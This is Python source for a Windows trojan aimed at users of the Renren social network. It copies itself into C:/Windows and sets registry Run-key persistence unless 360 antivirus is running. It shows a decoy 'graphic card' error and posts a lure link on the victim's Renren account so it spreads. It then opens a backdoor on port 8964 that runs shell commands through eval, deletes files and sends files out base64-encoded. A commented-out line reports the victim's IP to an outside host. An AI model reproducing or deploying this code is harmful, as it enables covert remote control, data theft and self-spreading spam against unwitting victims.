#-*-coding:utf-8-*-

import SocketServer, os, time, ctypes, base64, sys, urllib2
import win32com.client
import win32process, win32event
import _winreg

class GrassMudTrojanServer:
    
    def __init__(self):
        self.controller = Controller()
    
    def isInWindows(self, name):
        return os.path.exists(r"C:/Windows/"+name)
    
    def copy2Windows(self, name):
        fp = open(name, "rb")
        fp2 = open("C:/Windows/"+name, "wb")
        fp2.write(fp.read())
        fp.close()
        fp2.close()
    
    def firstRun(self):
        return not os.path.exists(r"C:/Windows/mark.log")
    
    def setServer(self):
        self.server = SocketServer.TCPServer(("", 8964), MyTCPHandler)    
    
    def createMark(self):
        fp = open("C:/Windows/mark.log", "w")
        fp.close()
    
    def isProcessExist(self, pname):
        WMI = win32com.client.GetObject('winmgmts:')  
        processCodeCov = WMI.ExecQuery('select * from Win32_Process where Name="%s"' % pname)
        return len(processCodeCov)>0
    
    def addToBootRun(self, name):
        key = _winreg.OpenKey(
                  _winreg.HKEY_LOCAL_MACHINE,
                  "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, r"C:\Windows\\"+name)

class Controller:
    
    def __init__(self):
        pass
    
    def testRenren(self, type):
        self.ie = win32com.client.Dispatch("InternetExplorer.Application")
        self.ie.Visible = 0
        self.ie.Navigate("http://renren.com")
        
        while self.ie.Busy:
            time.sleep(1)
        
        document = self.ie.Document
        result = (document.URL == "http://www.renren.com/home" or "guide.renren.com" in document.URL)
        if type == 0:
            self.ie.Quit()            
        return result
               
    def send2Renren(self, msg):
        if self.testRenren(1):
            document = self.ie.Document
            #while document.readyState != 'complete':
            #   continue
            while not document.getElementById("publisher_submit") or not document.getElementById("publisher_statusInput"):
                time.sleep(1)
                continue
            document.getElementById("publisher_statusInput").value= msg
            document.getElementById("publisher_submit").click()
                
    def showMsg(self, msg, title):
        MessageBox = ctypes.windll.user32.MessageBoxA
        MessageBox(None, msg, title, 0) 

class MyTCPHandler(SocketServer.BaseRequestHandler):

    def __init__(self):
        self.controller = Controller()
    
    def handle(self):
        path = self.request.send(os.getcwd())
        while True:
            cmd = self.request.recv(10240).strip()
            if cmd == "ls":
                type = 'data'
                data = "  ".join([filename+'*' if os.path.isdir(filename) else filename for filename in os.listdir(".")])
            elif cmd == "testrenren":
                type = 'data'
                data = "Yes" if self.controller.testRenren(0) else "No"
            elif cmd == "quit":
                break
            elif cmd.split(" ")[0] in ['send2renren', 'alert']:
                cmd, opt = cmd.split(" ")[0], "".join(cmd.split(" ")[1:])
                if cmd == 'send2renren':
                    self.controller.send2Renren(opt)
                elif cmd == 'alert':
                    self.controller.showMsg(opt, "Alert")
                type = 'data'
                data = 'Success'
            elif len(cmd.split(" ")) > 1:
                cmd, opt = [i for i in cmd.split(" ") if i]
                if cmd == "cd":
                    try:
                        os.chdir(opt)
                        data = os.getcwd().replace("\\", "/")
                        type = 'path'
                    except:
                        type = 'data'
                        data = 'Failed. No such directory.'
                elif cmd in ["mkdir", "rmdir", "rm", "system"]:
                    type = 'data'
                    try:
                        eval("os.%s('%s')" % (cmd, opt))
                        data = 'Successed.'
                    except:
                        data = 'Failed.'
                elif cmd == 'wget':
                    type = 'data'
                    fp = open(opt, "rb")
                    content = fp.read()
                    data = base64.b64encode(content)
            else:
                type = "data"
                data = "Unknow command"
            
            self.request.send('{"type": "%s", "data": r"%s"}' % (type, data))


if __name__ == "__main__":
    trojan = GrassMudTrojanServer()
    filename = os.path.basename(sys.argv[0])
    if not trojan.isInWindows(filename):
        try:
            trojan.copy2Windows(filename)
        except:
            pass
        time.sleep(3)
        #handle = win32process.CreateProcess("C:/Windows/"+filename,
        #    '', None , None , 0 ,win32process. CREATE_NO_WINDOW , None , None ,
        #   win32process.STARTUPINFO())
        #win32event.WaitForSingleObject(handle[0], 0)
        os.execv("C:/Windows/"+filename, [filename])
        trojan.controller.showMsg("Graphic card unsupported !", "Alert")
    else:
        if trojan.firstRun():
            try:
                trojan.createMark()
            except:
                pass
            if not trojan.isProcessExist("360tray.exe"):
                trojan.addToBootRun(filename)
        trojan.controller.send2Renren(u"4M的游戏竟然能有这样的效果。。独立游戏节获奖作品。。http://goo.gl/NNhvY")
        #urllib2.urlopen("http://wong2.cn/works/trojan/ip.php").read()
        server = SocketServer.TCPServer(("", 8964), MyTCPHandler)    
        server.serve_forever()